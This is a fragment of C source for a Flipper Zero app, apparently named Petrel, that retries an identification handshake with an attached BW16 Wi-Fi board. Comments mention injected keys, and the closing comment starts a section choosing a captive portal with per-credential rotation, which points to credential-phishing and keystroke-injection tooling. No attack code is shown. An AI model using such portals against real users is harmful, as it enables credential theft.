// Re-ask the board for its IDENT while we have not heard back yet. The board answers HELLO
// with "IDENT:brand=PETREL;fw=..;caps=..;board=BW16"; the app sends HELLO once at startup, and
// if that reply is missed (board still booting) the UI stayed on "(no IDENT)" forever.
// Retrying on each main/hub/help entry makes it self-heal.
static void petrel_ident(Petrel* app) {
    // NOTE: no diag() here. This function is called from the 10 ms tick, and logging at its top meant
    // logging on EVERY call - including the early returns - which wrote ~100 records/s to the SD and
    // slowed the app enough to lose injected keys. The retry path already logs kind 18 when it
    // actually transmits, which is the event worth recording.

    // Bounded (architect): at most three attempts, 3 s apart, and never again once identified. The
    // previous version retried forever while fw_caps stayed empty - every 3 s, for the whole session,
    // and each call oscillated the free heap by ~6 KB, which is what made allocations fail later.
    // 2026-10-28: keep trying, slowly, instead of giving up after three. The board now re-arms its
    // Serial1 after 10 s of silence (firmware self-heal), so a link that died in a Flipper reboot
    // comes back on its own — but only if the app is still asking. 3 quick tries at boot, then one
    // every 10 s (capped at 20 so an absent board cannot churn the heap forever).
    if(app->fw_caps[0] != '\0' || app->ident_attempts >= 20) return;
    uint32_t now = furi_get_tick();
    uint32_t ident_gap_ms = (app->ident_attempts < 3) ? 3000u : 10000u;
    if(app->ident_attempts != 0 &&
       (uint32_t)(now - app->ident_last_tick) < furi_ms_to_ticks(ident_gap_ms))
        return;
    app->ident_last_tick = now;
    app->ident_attempts++;
    if(app->ident_attempts > 1) diag(18, app->ident_attempts, 0);
    uart_helper_send(app->uart_helper, "HELLO\n", 6);
}

// C2: tell the board which portal to serve. "Rotate" (index CAPTIVE_PORTAL_SIZE-1) enables the
// firmware's per-credential rotation instead of a fixed page.
